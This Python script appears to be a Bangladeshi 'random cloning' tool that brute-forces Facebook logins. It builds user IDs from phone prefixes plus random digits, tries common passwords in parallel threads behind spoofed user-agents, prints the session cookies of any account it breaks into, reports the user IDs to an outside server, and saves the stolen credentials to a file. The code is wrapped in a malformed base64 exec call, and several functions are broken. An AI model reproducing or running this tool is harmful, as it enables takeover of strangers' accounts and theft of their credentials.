import base64
exec(base64.b64decode("import os
os.system("git pull")
os.system("pip install request")
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pkg install espeak')

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop =0
os.system('clear')
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
#os.system('espeak -a 300 " Welcome,   to,  TAYBUL, Tools"')
pass        

logo = ("""  \x1b[1;97m
┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
┃\033[1;33m████████╗░█████╗░██╗░░░██╗██████╗░██╗░░░██╗██╗
┃\033[1;33m╚══██╔══╝██╔══██╗╚██╗░██╔╝██╔══██╗██║░░░██║██║
┃\033[1;33m░░░██║░░░███████║░╚████╔╝░██████╦╝██║░░░██║██║
┃\x1b[1;93m░░░██║░░░██╔══██║░░╚██╔╝░░██╔══██╗██║░░░██║██║
┃\x1b[1;93m░░░██║░░░██║░░██║░░░██║░░░██████╦╝╚██████╔╝███████╗
┃\x1b[1;93m░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░░╚═════╝░╚══════╝
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━╗
\033[38;5;46m┃ \33[37;41mADMIN \033[1;38m{=} \033[1;38mTAYBUL         \33[0;m┃\33[37;47m \033[1;31mUPDATE    \33[0;m┃
\033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┫
\033[38;5;46m┃ \33[37;41mTOOLS \033[1;37m{=} \033[1;37mBD RANDOM      \33[0;m┃\33[37;41m 0.1      \33[0;m ┃
\033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━┫
\033[38;5;46m┃ \33[37;47m\033[1;31mFACEBOOK \033[1;31m{=} \033[1;31mMD TAYBUL ISLAM        \33[0;m ┃
\033[38;5;46m┃ \33[37;47m\033[1;31mWHATSAPPS \033[1;31m{=} \033[1;31m 01747130005          \33[0;m ┃
\033[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;37m\n""")
def TABULsexyx():
	print('•>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[TAYBUL]>>>>>>>>>>>>>>>>>>')
os.system('clear')
print(logo)
os.system('espeak -a 300 "ENTER PASSWORD  "')
CorrectUsername = 'cyber101xx'
key = 'Taybul'
while key == 'Taybul':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER PASSWORD \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
    	os.system('espeak -a 300 " SUCCESS PASSWORD "')
    	print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN BOSS TOOL SUCCESSFULLY')
    time.sleep(1)
    key = 'false'

def Taybul():
        os.system("clear")
        os.system('xdg-open https://m.facebook.com/groups/151296501309001/?ref=share&mibextid=NSMWBT')
        os.system('espeak -a 300 "WELCOME TO TAYBUL RANDOM TOOLS"')
        print(logo)
        print(" \x1b[1;93m[1] RANDOM CLONING \x1b[1;95m (BANGLADESH)")
        print(" \x1b[1;94m[0] Exit")
        TABULsexy =input("\n \x1b[1;96m[?] Choose : ")
        if TABULsexy in ["1","01"]:
            taybul()
        if TABULsexy in [" 0", "00"]:
            exit()
        else:
            exit()
            
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
lin= 40* '-'
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__Taybul__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('DUMP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    
            
def taybul():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100073203797287')
    os.system('espeak -a 300 "ENTER YOUR SIM CODE"')
    print(logo)
    print('\x1b[1;92m•>>>>>>>>>>>>>>>≥>>>>>>>>>>>>>>>>>>>>>>>')
    print('\n\x1b[1;94mᏴᎠ ՏᏆᎷ ᏟϴᎠᎬ ➤➤\033[1;33m[017] \033[1;32m[018] \033[1;34m[019] \033[1;31m[014] \033[1;35m[013] \033[1;33m[016]')
    code = input('[?] CHOOSE SIM CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/mataybul07?mibextid=ZbWKwL')
    print(logo)
    print('\x1b[1;93m•────────────────•TAYBUL.────────────────•')
    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT"')
    print('      \x1b[1;95m   𝐄??𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐂𝐑𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓')
    print('\n[+] EXAMPLE: [2000] [3000] [5000] [10000] ')
    print('.>>>>>>>>>>>>>>[TAYBUL_FREE_COMMAND]>>>>>>')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
        print(logo)
        tl = str(len(user))
        print('\x1b[1;93m•<<<<<<<<<<<<<<<<TAYBUL>>>>>>>>>>>>>>•')
        print("[✿] \x1b[1;94mYOUR NAME: "+uname)
        print('[✿] \x1b[1;92mTOTAL IDZ: \x1b[1;91m'+tl)
        print("[✿] \x1b[1;94mYOUR SIM CODE: "+code)
        print("[✿] \x1b[1;95m USE AROPLAN MOD ON/OFF")
        print("[✿] \x1b[1;93mADMIN FOR TAYBUL")
        print('•<<<<<<<<<<<<<<<<COMMAND>>>>>>>>>>>>•')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','bangla','Mimmim']
            yaari.submit(TABULsexy2,uid,pwx,tl)
    print('•────────────────•°•❀•°•────────────────•')
    print(' [+] Crack process has been completed')
    print(' [+] OK :\033[0;92m %s '%(ok))
    print(' [+] CP :\033[0;93m %s '%(cp))
    print(' [+] OK Ids saved in TAYBUL/OK.txt')
    print(' [+] CP Ids saved in TAYBUL/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def TABULsexy2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mTAYBUL_XD\033[1;90m] %s|\033[1;32mOK:-%s\033[1;37m\r'%(loop,len(oks)))                    
            sys.stdout.flush()                                
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'save-data': 'on',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                cix = coki.split('c_user')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:            
                    print('\033[38;5;46m[TAYBUL-OK] '+uid+' . '+ps+'  \n\033[1;33m [TAYBUL]\033[1;33m[COOKIES] = \033[1;32m'+coki+  ' \n\033[1;33m')
                    os.system('espeak -a 300 " Taybul,  Ok,  id"')
                    cek_apk(session,coki)
                    open('/sdcard/TABUL/OK.txt', 'a').write( uid+' | '+ps+'\n')
                    oks.append(uid)
                    break
            elif 'checkpoint' in log_cookies:
                        coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                        uid=coki[24:39]
                        Red = '\033[1;31m'
                        #os.system("play-audio TAYBUL_CP.mp3")
                        #print(f'\r\033[1;30m[TAYBUL-CP] '+uid+' [×] '+ps+ ' ')
                        #open('/sdcard/TAYBUL-CP.txt', 'a').write(uid+' | '+ps+'\n')
                        cp.append(uid)
                        break
            else:
                continue
        loop+=1
    except:
        pass
        
Taybul()
"))